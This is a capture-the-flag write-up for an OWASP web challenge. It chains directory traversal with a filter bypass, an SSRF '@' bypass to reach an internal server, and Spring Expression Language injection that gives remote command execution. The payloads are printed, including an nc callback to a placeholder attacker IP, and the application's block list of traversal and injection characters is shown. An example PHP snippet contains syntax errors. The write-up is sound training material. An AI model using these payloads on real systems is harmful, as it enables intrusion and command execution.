# Shopaholic
**Vector Type:** Web

**Description:** 

> Are you a shopaholic?
> Visit http://smartstore.owaspctf17.pro/ and shop some flags.
> Hint 1: Try looking for main.go
> Hint 2: Look at the attached image 

**Goal:** 

Grabbing our flag via usage of a web vulnerability (or maybe some more, who knows?) within the application, while sticking to provided hints.

## Looking for a new TV

Let's go and access the web application via "http://smartstore.owaspctf17.pro". Looks like a normal shopping website that has some decent products to offer, but does it offer any flags?! we shall see.

![Main web page](https://gyazo.com/36061c4b9a79de80a91e61c365ae4934.png)

Wandering around the website and checking some features led us to "Products" page, that contains every product that is available on the website, well most of it :)
On each product, we have two available functions: "View Product", and "Download PDF". So let's ignite our proxy interceptor and test each one of these functions.

Starting off with "Download PDF" on our desired TV, revealed us some interesting endpoint. 

![Download PDF TV product](https://gyazo.com/128fd40b03d94ce50ebd7c402f987016.png)

As we can already identify, a GET request is being sent to "/downloadFile" endpoint with a very interesting parameter, which is `file`, and it actually specifies a file that is stored on the web server. Usually, applications should validate user input, so when a page receives the given input it will escape all unauthorized signs as of **`/`**, **`.`**. So we can send some of the following at the beginning of the desired file:

> **`..`**
> **`../`**
> **`.././`**

Sometimes its better to visualize it by looking at an code example, and understand whats actually happens. lets take this PHP code for an example:

```php 
$page = $_GET['page'] ?? 'home';
var $sanitized_value;
$banned_array = array("../", "./", ".././");

//sanitize the $_GET value.
$sanitized_value = str_replace($banned_array, "", $page);
}

// return the requested sanitized file string
echo file_get_contents('../pages/'.$sanitized_value.'.php');
```

its very simple, the `page` parameter receives its value via `GET` request, now the `banned_array[]` contains all the "bad signs" that could allow directory traversal. Then it will use `str_replace` to remove each value inside `banned_array[]` and store it in a new parameter `sanitized_value`. so if we set the `page` parameter to "../file", the final result of `sanitized_value` will be "file".

Our first hint was to try and look for "main.go" file that is probably located somewhere on the server, so let's grab it.

We will try some traditional directory traversal patterns, adding by `../` just before "main.go" in order to go back one folder.

![Testing file param](https://gyazo.com/43079f57389c26f370a0f7e339b7e813.png)

Checking the presented response it looks like we are in the same folder ("downloads"), so it seems that there is some user input validation here, which filters out `../`. let's try and bypass it with **encoded traversal strings**, as an example **`..././`**.

![Got our LFI](https://gyazo.com/c0fa593feec6e2c9eea6a9ee1f182c2a.png)

Voilà! we got 200 OK sent back from the server, following "main.go" source code as promised. Now we must analyze and understand this piece of code, so we can find some flaws.

## Analysing the main piece of code

We will go step by step on each relevant piece of code in order to seek our flaws, and get to know the application better.

```
var (
    RESOURCE_SERVER = "http://127.0.0.1"
    DOWNLOAD_DIRECTORY = "./downloads/"
    ILLEGAL_CHARS = []string {
        "../",
        "<!--",
        "-->",
        "<",
        ">",
        "'",
        "\"",
        "&",
        "$",
        "#",
        "{", "}", "[", "]", "=",
        ";", "?", "%20", "%22",
        "%3c",   // <
        "%253c", // <
        "%3e",   // >
        "",   // > -- fill in with % 0 e - without spaces in between
        "%28",   // (
        "%29",   // )
        "%2528", // (
        "%26",   // &
        "%24",   // $
        "%3f",   // ?
        "%3b",   // ;
        "%3d",   // =
    }
    CALCULATION_SERVER = "http://10.0.0.185:8080/calc"
)
```

We can see that there are some interesting declarations of global variables, which are used within the application. What are they?

`RESOURCE_SERVER` - stores the localhost web URL.

`ILLEGAL_CHAR` - stores an array of illegal chars as a string. now we can see which chars the application filters, and it's being used only in `SanitizeFilename()` function, on purpose of preventing common Directory Traversal attacks.

`CALCULATION_SERVER` - stores an **internal** URL for a calculation service at "10.0.0.185:8080/calc".

Focusing on the `main()` function shows us the path of each page following their functions.

```golang
func main() {
    r := mux.NewRouter()

    // Dynamic Pages
    r.HandleFunc("/getResource", getResource).Queries("path", "{path}")
    r.HandleFunc("/downloadFile", downloadFile).Queries("file", "{file}")
    r.HandleFunc("/calc", calc)
    r.HandleFunc("/login", login)
```

The first function we are going to investigate is the `getResource()` function that is set under "/getResource" page.

```golang
func getResource(w http.ResponseWriter, r *http.Request) {
    path := mux.Vars(r)["path"]
    path = strings.Replace(path, " ", "%20", -1)
    req, err := http.NewRequest("POST", RESOURCE_SERVER + path, nil)
    req.Header.Set("Host", strings.Split(RESOURCE_SERVER, "//")[1])
    req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
    if err != nil {
        errorHandler(w, r, http.StatusInternalServerError, "")
        return
    }
    client := &http.Client{}
    res, err := client.Do(req)
    if err != nil {
        errorHandler(w, r, http.StatusInternalServerError, "Resource Server Connection Error")
        return
    }

    defer res.Body.Close()
    body, _ := ioutil.ReadAll(res.Body)
    response := string(body)
    w.Header().Set("Content-Type", "application/json")
    w.Header().Set("Server", "Golang HTTP Server")
    fmt.Fprint(w, response)
}
```

The function takes two arguments: `http.ResponseWriter` which its value assembles the HTTP server's response, and http.Request which is a data structure that represents the client HTTP request. When invoking this function by accessing "/getResource" endpoint with `GET` method and `path` parameter, a new `POST` request will be sent to `RESOURCE_SERVER` which is 127.0.0.1, following the `path` value afterward. If we set `path` as "/test", then we will trigger the next request : 

```
POST http://127.0.0.1/test HTTP/1.1
```

Wait a minute... we can now send an HTTP request to any external and internal targets! and we got an interesting **internal calculation server**, if the bell doesn't ring stay tuned for the next part.

## Testing SSRF

We will try and send a request with an empty `path` value, and see what we get.

![SSRF trying localhost](https://gyazo.com/c01f284672f9277be6bed89dc585b0ad.png)

Server response seems like an SSRF, so we can just specify any IP and access it, and we do **have an internal IP** to check. but if we will try and set the `path` value to "10.0.0.185:8080" we will trigger the next request:

```
POST http://127.0.0.1/10.0.0.185:8080 HTTP/1.1
```

Which will result in an internal server error, so we must bypass it in a way that the server will ignore "127.0.0.1" address. 

Maybe it relates to our second hint?

![Second hint](https://gyazo.com/c3ef920c2d2e5e878733b9a7d3ea7327.png)

Black hat, Orange, and tsai? well lucky we have Google.


So we get that it's a famous hacker (which I personally respect a lot), and his recent publishment on ways to exploit SSRF.

![Google search](https://gyazo.com/d9dde342999d41b7524872a66dcddd48.png)

After exploring his method of bypassing common URL parsers, We can figure out that by adding the "@" sign at the start of `path` parameter, will ignore "127.0.0.1" on the request.

![Filtering Bypass](https://gyazo.com/fc658ab20e11427a24a180c44fe9008d.png) 

Now that we have got our SSRF working, we must understand how does the `calc()` function works. 

## Back to the Code

First, let's dive into the `calc()` function, and figure out what it does.

```golang
func calc (w http.ResponseWriter, r *http.Request) {
    item_id := r.URL.Query().Get("item_id")
    country_code := r.URL.Query().Get("country_code")
    quantity := r.URL.Query().Get("quantity")
    if item_id == "" || country_code == "" || quantity == "" {
        errorHandler(w, r, http.StatusInternalServerError, "Invalid Parameters")
        return
    }
    _, err := strconv.Atoi(quantity)
    if err == nil {
        query := "?item_id=" + item_id + "&" + "country_code=" + country_code + "&" + "quantity=" + quantity
        req, err := http.NewRequest("POST", CALCULATION_SERVER + query, nil)
        req.Header.Set("Host", strings.Split(CALCULATION_SERVER, "//")[1])
        {redacted}
```

When analyzing the `calc()` function we see that a `POST` request is being sent to `CALCULATION_SERVER`, following three parameters: `item_id`, `country_code`, and `quantity`.
Sending the request with random numbers actually worked.
me when i.

![Sending a request to calc](https://gyazo.com/d5cafc6762797fe0d70708e4d8d2c70d.png)

Hold it! We are trying to send a request with parameters to a different web server, via "SmartStore" website. So we must URL encode the ampersand "&" which equals to "%26", and by that the second/third parameter will reach to our internal web server, and not to the "SmartStore" web server.

If We fuzz around with the parameters value, We will notice that `country_code` parameter does not affect the given output, On the other hand `quantity` **does return its value in the response output** when inserting numeric digits.

![Quantity is being returned](https://gyazo.com/8cf7a909ed384e73dfc234978e974460.png)

Let's try and add some special signs and see what we get.

![Let the story begin](https://gyazo.com/568c58003c620940eceb2df17f6cfea9.png)

Obviously "Expression Language" is being used here, So cancel all your appointments, We've got some work to do!

## Expression Language Injection

**Definition**
>Expression Language (EL) Injection happens when attacker controlled data enters an EL interpreter.

We can take some time and read an amazing EL Injection in Spring Boot by "deadpool" ![Link to deadpool blog](http://deadpool.sh/2017/RCE-Springs/).

So we can try and send a request with an injection that will execute a given command using the java's `Runtime` class, following by the `exec()` method. We will check if we can execute any command.
We will use the Linux `id` command, just to verify that we can execute code on the target web server.

```java
T(java.lang.Runtime).getRuntime().exec('id')

```
![ID via ELi](https://gyazo.com/25f08203df2de8f37b453df5ecacf125.png)

The request hangs for like 40 seconds, and we don't get any output in the HTTP response, so why not sending a command that doesn't require an HTTP response?
let's set an "nc" listener, and set `quantity` value to the next payload:

```java
T(java.lang.Runtime).getRuntime().exec('nc%20IP%20PORT')

```
![NC via ELi](https://gyazo.com/3489861369a70b000067419aa54f530e.png)

Nice, so we **verified our code execution** on the web server, let's try and grab our flag. 

So in order to get output in the HTTP Response, we will use the "Spring Framework" `StreamUtils` class and call the `copyToString()` method. We can pass an input stream to this method and get the contents of the stream as a response.
the finaly payload should look like the following: 

```java
T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec('ls').getInputStream(),'utf-8')
```
![Flag via ELi](https://gyazo.com/313633ccdab5e833cd3c120ca34eed08.png)

Yay! Hope you've enjoyed it.